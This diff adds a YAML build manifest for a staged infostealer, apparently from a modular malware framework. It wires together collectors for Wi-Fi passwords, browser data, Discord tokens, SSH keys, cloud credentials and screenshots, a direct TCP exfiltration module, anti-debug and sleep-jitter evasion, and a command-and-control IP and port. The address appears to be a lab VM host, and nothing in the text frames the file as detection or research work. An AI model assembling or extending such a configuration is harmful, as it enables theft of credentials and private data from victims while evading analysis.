@@ -1,0 +1,29 @@
+name: infostealer_staged
+description: Infostealer with behavioral pacing and anti-debug
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/env_vars
+  - collectors/wifi_passwords
+  - collectors/browser_chromium
+  - collectors/discord_tokens
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/staged
+
+evasion:
+  - evasion/anti_debug
+  - evasion/sleep_jitter
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
